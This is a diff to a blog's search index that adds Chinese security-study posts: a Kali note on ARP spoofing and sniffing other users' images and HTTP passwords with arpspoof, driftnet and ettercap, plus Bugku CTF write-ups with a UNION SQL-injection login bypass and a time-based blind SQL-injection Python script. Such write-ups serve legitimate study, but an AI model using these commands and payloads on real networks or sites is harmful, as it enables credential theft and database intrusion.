@@ -1,6 +1,44 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[kali渗透常用工具]]></title>
+    <url>%2F2018%2F08%2F23%2Fkali%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%2F</url>
+    <content type="text"><![CDATA[关于arpspoof工具的arp欺骗ARP地址解析协议(ARP)，ARP(Address Resolution Protocol)，是一个位于TCP/IP协议栈中的网络层。当局域网内计算机间（或者是计算机与网关间）需要通信时，使用ARP协议获取目标IP地址对应的MAC地址，然后计算机间再通过该MAC地址完成数据包发送。ARP欺骗一般目的是把自己伪装成网关，从而欺骗目标机器，使本应发送到真实网关的数据包发送到欺骗者的机器。 arpspoof工具 功能： arpspoof通过伪造arp回复包将局域网中主机A（或者所有主机）的网路包重定向到主机B。用法： arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host 局域网断网工具ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。 这里我用我的win10物理机当作目标机，这里可见此时是可以 ping 通 baidu 的进行arp攻击arpspoof -i 网卡名称 -t 目标机ip 网关发现物理机已经断网了 获取内网他人浏览的图片物理机当作目标机kali 使用 arpspoof 工具 arpspoof -i 网卡名称 -t 目标机ip kali的ip使用 driftnet 工具 driftnet -i 网卡名称 ，然后在目标机上百度搜索图片，可以看到 driftnet 有了反应，获取成功 获取他人账号密码(HTTP)物理机当作目标机kali 先打开ip转发 echo 1 &gt; /proc/sys/net/ipv4/ip_forward(了解更多)arp欺骗 arpspoor -i 网卡名称 -t 目标机ip kali的ip使用ettercap进行嗅探 ettercap -Tq -i eth0成功启动后在物理机上测试，在http协议的网站输入用户名和密码，发现已经被 ettercap 嗅探到 获取他人账号密码(HTTPS)]]></content>
+      <categories>
+        <category>Learning</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>Web</tag>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[WP-Bugku-PHP_encrypt_1(ISCCCTF)]]></title>
+    <url>%2F2018%2F08%2F21%2FWriteup%2FWP-Bugku-PHP-encrypt-1-ISCCCTF%2F</url>
+    <content type="text"><![CDATA[题目直接给出了加密源码123456789101112131415161718192021&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; 输出 fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= 这里直接给出解密的源码1234567891011121314151617181920212223242526272829303132333435&lt;?phpfunction decrypt($str) &#123; $mkey = "729623334f0aa2784a1599fd374c120d"; $klen = strlen($mkey); $tmp = $str; $tmp = base64_decode($tmp); // 对 base64 后的字符串 decode $md_len = strlen($tmp); //获取字符串长度 for ($i=0; $i &lt; $md_len; $i++) &#123; // 取二次加密用 key; if ($x == $klen) // 数据长度是否超过 key 长度检测 $x = 0; $char .= $mkey[$x]; // 从 key 中取二次加密用 key $x+=1; &#125; $md_data = array(); for($i=0;$i&lt;$md_len;$i++) &#123; // 取偏移后密文数据 array_push($md_data, ord($tmp[$i])); &#125; $md_data_source = array(); $data1 = ""; $data2 = ""; foreach ($md_data as $key =&gt; $value) &#123; // 对偏移后的密文数据进行还原 $i = $key; if($i &gt;= strlen($mkey)) &#123;$i = $i - strlen($mkey);&#125; $dd = $value; $od = ord($mkey[$i]); array_push($md_data_source,$dd); $data1 .= chr(($dd+128)-$od); // 第一种可能, 余数+128-key 为回归数 $data2 .= chr($dd-$od); // 第二种可能, 余数直接-key 为回归数 &#125; print "data1 =&gt; ".$data1."&lt;br&gt;\n"; print "data2 =&gt; ".$data2."&lt;br&gt;\n";&#125;$str = "fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=";decrypt($str);?&gt; Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+        <tag>Web</tag>
+        <tag>Bugku</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[WP-Bugku-login2(SKCTF)]]></title>
+    <url>%2F2018%2F08%2F21%2FWriteup%2FWP-Bugku-login2-SKCTF%2F</url>
+    <content type="text"><![CDATA[题目地址http://118.89.219.210:49165/ 随便输入用户名，密码抓包测试，发现返回的爆里有一个tip base64解码后的到源码：123$sql="SELECT username,password FROM admin WHERE username='".$username."'";if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123; &#125; 题目提示了union 那么尝试注入1&#39; union select 1,&#39;5f4dcc3b5aa765d61d8327deb882cf99&#39;--password 这里 5f4dcc3b5aa765d61d8327deb882cf99 是经过md5加密后的 password 登陆成功后跳转到了 http://118.89.219.210:49165/index.php]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Bugku</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[WP-Bugku-INSERT INTO注入]]></title>
     <url>%2F2018%2F08%2F19%2FWriteup%2FWP-Bugku-INSERT%20INTO%E6%B3%A8%E5%85%A5%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web15/ 题目给了源码123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123; $ip = ''; if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; &#125;else&#123; $ip = $_SERVER['REMOTE_ADDR']; &#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); 这是X_FORWARDED_FOR注入，但是过滤了,在,被过滤的情况下，无法使用if语句当然在mysql下除了if还有1select case when xxx then xxx else xxx end; 而且由于,被过滤，无法使用substr和substring，但是这里可以使用from 1 for 1替代，最后payload如下111'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))%23 python 脚本12345678910111213141516171819import requestsimport string mystring = string.ascii_letters+string.digitsurl='http://120.24.86.145:8002/web15/'data = "127.0.0.1'+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end) and '1'='1" #这里的&#123;&#125;对应的是后面所需要的formatflag = ''for i in range(1,35): for j in mystring: try: headers = &#123;'x-forwarded-for':data.format(str(i),j)&#125; res = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag += j print flag breakprint 'The final flag:'+flag 这个代码的原理就是利用127.0.0.1+true/false去进行判断，如果是true，就与超时相违背，从而执行下面except的代码。 得到 flag{cdbf14c9551d5be5612f7bb5d2867853}]]></content>
@@ -311,8 +349,8 @@
       </categories>
       <tags>
         <tag>笔记</tag>
-        <tag>sqlmap</tag>
         <tag>Web</tag>
+        <tag>sqlmap</tag>
       </tags>
   </entry>
   <entry>
@@ -324,8 +362,8 @@
       </categories>
       <tags>
         <tag>笔记</tag>
-        <tag>Web</tag>
         <tag>SQL</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -350,8 +388,8 @@
       </categories>
       <tags>
         <tag>笔记</tag>
-        <tag>Web</tag>
         <tag>SQL</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
